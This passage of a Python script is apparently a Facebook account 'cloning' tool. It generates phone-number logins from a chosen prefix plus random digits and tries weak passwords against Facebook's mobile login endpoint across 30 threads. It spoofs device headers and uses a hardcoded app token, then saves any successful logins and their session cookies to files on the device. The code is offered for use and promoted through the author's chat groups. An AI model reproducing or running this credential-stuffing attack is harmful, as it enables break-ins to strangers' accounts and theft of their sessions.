-7255","GT-7313","GT-7317","GT-7322","GT-7329","GT-7323","GT-7330","GT-7409","GT-7560 5GT-8005","GT-8070","GT-85","GT-815","GT-8155","GT-8115","GT-8225S","GT-8418","GT-9500I","GT-9370","GT-96G","GT-A7300","GT-A9700","GT-ANDROID","GT-B2990","GT-B5350","GT-B5370F","GT-B5360Z","GT-B5330FXXINU","GT-B5710","GT-B5519","GT-B5842","GT-B7910","GT-B7922","GT-B7830","GT-B9190","GT-B9398","GT-C3410","GT-C3363","GT-C3310Q","GT-C3342","GT-C3315X","GT-C3316H","GT-C3232","GT-C3422i","GT-C3560","GT-C3420I","GT-C3582","GT-C3595","GT-C3782","GT-C6712","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-A520F","SM-A510FD","SM-A530","SM-A530F","SM-N950F","SM-G5510","SM-G5510F","SM-G530F","SM-G531F","SM-G532F","SM-G531H","SM-J100","SM-J100H","SM-J110","SM-J110H","SM-J120H","SM-J200H","SM-J200F","SM-J300H","SM-J3110","SM-J400","SM-J500M","SM-J500F","SM-J510F","SM-J510FD","SM-J520F","SM-J530F","SM-A310F","SM-A320F","SM-A320FD","SM-A600M","SM-A600F","SM-A710F","SM-A720FD","SM-F022","SM-A127F","SM-A125F","SM-C7000","SM-7100","SM-C7010Z","SM-C7010F","SM-A600FN","SM-7562I","SM-7572","SM-7562","SM-7010H")
def FKING():
			clear()
		#	linex()
			print('[1] RANDOM CLONING \n[2] JOIN MY FB GROUP \n[3] JOIN MY WHATSAPP GROUP \n[0] EXIT FKING')
			linex()
			jf=input(' Choose an option: ')
			if jf in ['1','01']:
				AFG()
			elif jf in ['2','02']:
			 os.system('xdg-open https://www.facebook.com/profile.php?id=avid.hafeez.944/')
			elif jf in ['3','03']:
			 os.system('xdg-open https://chat.whatsapp.com/E7XWrYjzV1eCQvOxkOYLbe')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')
			
				
				
								
def AFG():
		user=[]
		clear()
		print('\033[1;35m Code example: 9379,9378,9377,9370')
		code = input('\033[1;37m PUT CODE: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;32m \n [1] \033[1;33mMethod ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print(' \n\033[1;32m [1] \033[1;33mCLONE WITH AUTO PASS (AFG) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as FKING:	
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','50005000']
					
				if mthd in ['1','01']:
					FKING.submit(fking1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python FKING.py')

FJoya1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
FJoya = random.choice(FJoya1)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [SAMANDAR➥KHAN]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(FJoya)
                        Fjjj=random.choice(FJoya)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Dalvik/2.1.0 (Linux; U; Android 11.0.0; 808SH Build/S2007) [FBAN/FB4A;FBAV/500.0.0.82.890;FBPN/com.facebook.katana;FBLC/cs_CZ;FBBV/522680587;FBCR/Etisalat Af;FBMF/SHARP;FBBD/SG;FBDV/808SH;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=888};FB_FW/1;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        jf =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{jf}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data ={'adid': '9A6bccC56b8db685', 
                        'format': 'json', 
                        'device_id': 'fc261096-a824-4e0c-b758-cdea01268a7d', 
                        'email': ids,
                        'password': pas,
                        'generate_analytics_claims': '1', 
                        'community_id': '', 
                        'cpl': 'true', 
                        'try_num': '1', 
                        'family_device_id': '8bf4b3bf-6f1b-4147-9a98-7e72854a9962', 
                        'secure_family_device_id': '22d82b5e-7f55-4f4d-a91a-b9c68a699834', 
                        'sim_serials': '["41669964333903521303"]', 
                        'credentials_type': 'password', 
                        'source': 'login', 
                        'error_detail_type': 'button_with_disabled', 
                        'fb4a_shared_phone_cpl_experiment':'fb4a_shared_phone_nonce_cpl_at_risk_v3', 
                        'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk', 
                        'enroll_misauth': 'false', 
                        'generate_session_cookies': '1', 
                        'generate_machine_id': '1', 
                        'jazoest': '2999', 
                        'meta_inf_fbmeta': '', 
                        'encrypted_msisdn': '', 
                        'currently_logged_in_userid': '0', 
                        'locale': 'en_US', 
                        'fb_api_req_friendly_name': 'authenticate', 
                        'fb_api_caller_class': 'Fb4aAuthHandler', 
                        'api_key': '350685531728', 
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                        headers={'X-FB-Friendly-Name': 'authenticate', 
                        'X-FB-Net-HNI': '12602', 
                        'X-FB-SIM-HNI': '52644', 
                        'X-FB-Connection-Type': 'Mobile.LTE', 
                        'User-Agent':ua,
                        'Accept-Encoding': 'gzip, deflate', 
                        'Content-Type': 'application/x-www-form-urlencoded', 
                        'X-FB-HTTP-Engine': 'Liger'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[31;47m [JOYA==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/F-JOYA-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/F-JOYA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[37;41m [JOYA==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/F-JOYA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
try:
	FKING()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()